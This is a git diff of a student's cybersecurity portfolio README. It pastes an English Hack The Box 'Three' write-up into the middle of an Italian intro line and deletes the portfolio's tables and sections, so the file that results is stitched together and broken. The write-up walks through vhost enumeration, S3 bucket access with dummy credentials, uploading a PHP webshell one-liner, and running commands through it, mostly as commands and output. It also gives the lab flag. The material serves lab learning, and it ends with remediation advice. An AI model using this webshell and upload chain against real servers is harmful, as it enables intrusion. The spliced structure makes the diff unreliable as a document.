@@ -1,75 +1,137 @@
 # 🛡️ Cybersecurity Portfolio — Luca Danisi
 
-> Portfolio pratico per ruoli junior in cybersecurity.  
+> Portfolio pratico per ruoli junior in cybersecurity.  # HTB - Three
+
+**Platform:** Hack The Box — Starting Point, Tier 1  
+**OS:** Linux  
+**Difficulty:** Very Easy  
+**Status:** Pwned ✅
+
+---
+
+## Summary
+
+Three is a Linux machine running a website for a band called "The Toppers". By enumerating virtual hosts, we discover an S3 bucket subdomain that is publicly accessible and writable. We upload a PHP webshell to the bucket, which is served by the web server, giving us remote code execution and allowing us to read the flag.
+
+---
+
+## Tools Used
+
+- `nmap` — port scanning
+- `gobuster` — directory and virtual host enumeration
+- `awscli` — S3 bucket interaction
+
+---
+
+## Steps
+
+### 1. Port Scanning
+
+```bash
+nmap -sC -sV 10.129.51.129
+```
+
+Result:
+
+```
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1
+80/tcp open  http    Apache httpd 2.4.29 (Ubuntu)
+```
+
+Port 80 serves a website called "The Toppers".
+
+### 2. Directory Enumeration
+
+```bash
+gobuster dir -u http://10.129.51.129 -w /usr/share/wordlists/dirb/common.txt
+```
+
+Nothing interesting found — just `images/` and `index.php`.
+
+### 3. Virtual Host Enumeration
+
+Added the domain to `/etc/hosts`:
+
+```bash
+echo "10.129.51.129 thetoppers.htb" | sudo tee -a /etc/hosts
+```
+
+Then ran vhost enumeration:
+
+```bash
+gobuster vhost -u http://thetoppers.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
+```
+
+Found: `s3.thetoppers.htb`
+
+Added it to `/etc/hosts`:
+
+```bash
+echo "10.129.51.129 s3.thetoppers.htb" | sudo tee -a /etc/hosts
+```
+
+### 4. S3 Bucket Access
+
+Configured awscli with fake credentials (no auth required):
+
+```bash
+aws configure
+# Access Key: temp / Secret Key: temp / Region: us-east-1
+```
+
+Listed the bucket:
+
+```bash
+aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
+```
+
+Found the web root files: `index.php`, `.htaccess`, `images/` — the bucket is the actual web server root.
+
+### 5. PHP Webshell Upload
+
+```bash
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
+```
+
+### 6. Remote Code Execution
+
+Confirmed RCE:
+
+```
+http://thetoppers.htb/shell.php?cmd=id
+# uid=33(www-data)
+```
+
+Found and read the flag:
+
+```
+http://thetoppers.htb/shell.php?cmd=find / -name flag.txt 2>/dev/null
+http://thetoppers.htb/shell.php?cmd=cat /var/www/flag.txt
+```
+
+---
+
+## What I Learned
+
+- Virtual host enumeration can reveal hidden subdomains not visible from the main site.
+- A misconfigured S3 bucket with public write access can lead to full RCE if it serves as the web root.
+- awscli works against non-AWS S3-compatible endpoints with fake credentials when no auth is enforced.
+
+---
+
+## Remediation
+
+- Never allow public write access to S3 buckets
+- Apply strict bucket policies and disable anonymous access
+- Never use an S3 bucket as a directly executable web root
+
+---
+
+## Flag
+
+`a980d99281a28d638ac68b9bf9453c2b`
 > Comprende writeup offensivi (HTB) e report difensivi (SOC Analyst).
 
 ---
-
-## 👤 About Me
-
-Studente di cybersecurity certificato **Cisco CCST Cybersecurity**, in percorso verso **CompTIA Security+** e oltre.
-Appassionato di sicurezza offensiva e difensiva, con focus su penetration testing e SOC analysis.
-
-🔗 [LinkedIn](https://www.linkedin.com/in/luca-danisi-5a80a227)  
-🟥 [Hack The Box Profile](https://app.hackthebox.com/users/3050365)
-
----
-
-## 🧰 Tools & Skills
-
-| Strumento | Categoria | Utilizzo |
-|---|---|---|
-| Nmap | Reconnaissance | Port scanning, service enumeration |
-| Wireshark | Network Analysis | Packet capture and traffic analysis |
-| Splunk | SIEM | Log analysis, alert monitoring |
-| Metasploit | Exploitation | Vulnerability exploitation framework |
-| Hydra | Password Attacks | Brute force SSH, FTP, web logins |
-| BurpSuite | Web Security | HTTP interception, web app testing |
-| John the Ripper | Password Attacks | Hash cracking |
-
----
-
-## ⚔️ HTB Machines (6/10)
-
-| # | Macchina | OS | Difficoltà | Tecnica | Writeup |
-|---|---|---|---|---|---|
-| 01 | Meow | Linux | Very Easy | Telnet, anonymous login | [Link](HTB/Meow/README.md) |
-| 02 | Redeemer | Linux | Very Easy | Redis enumeration | [Link](HTB/Redeemer/README.md) |
-| 03 | Appointment | Linux | Very Easy | SQL Injection | [Link](HTB/Appointment/README.md) |
-| 04 | Responder | Windows | Very Easy | LFI, NTLMv2, WinRM | [Link](HTB/Responder/README.md) |
-| 05 | Crocodile | Linux | Very Easy | FTP anonymous, directory brute force | [Link](HTB/Crocodile/README.md) |
-| 06 | Sequel | Linux | Very Easy | MySQL unauthenticated access | [Link](HTB/Sequel/README.md) |
-| 07 | Coming soon... | - | - | - | - |
-| 08 | Coming soon... | - | - | - | - |
-| 09 | Coming soon... | - | - | - | - |
-| 10 | Coming soon... | - | - | - | - |
-
----
-
-## 🛡️ SOC / Offensive Lab Reports (4/10)
-
-| # | Titolo | Tecnica | Strumento | Report |
-|---|---|---|---|---|
-| 01 | File Upload Exploit + BurpSuite | PHP Web Shell, RCE | BurpSuite | [Link](SOC/01-FileUpload/README.md) |
-| 02 | XSS + SQL Injection | Cookie Stealing, UNION Attack | DVWA | [Link](SOC/02-XSS-SQLi/README.md) |
-| 03 | Password Cracking | John the Ripper, MD5 Hash | John/Metasploitable | [Link](SOC/03-PasswordCracking/README.md) |
-| 04 | Authentication Cracking | Brute Force SSH/FTP | Hydra | [Link](SOC/04-AuthCracking/README.md) |
-| 05 | Coming soon... | - | - | - |
-| 06 | Coming soon... | - | - | - |
-| 07 | Coming soon... | - | - | - |
-| 08 | Coming soon... | - | - | - |
-| 09 | Coming soon... | - | - | - |
-| 10 | Coming soon... | - | - | - |
-
----
-
-## 🏅 Certificazioni
-
-| Certificazione | Stato | Anno |
-|---|---|---|
-| Cisco CCST Cybersecurity | 🔄 In corso | 2026 |
-| CompTIA Security+ | 🗓️ Pianificato | 2026 |
-
----
-
-*Ultimo aggiornamento: Marzo 2026*
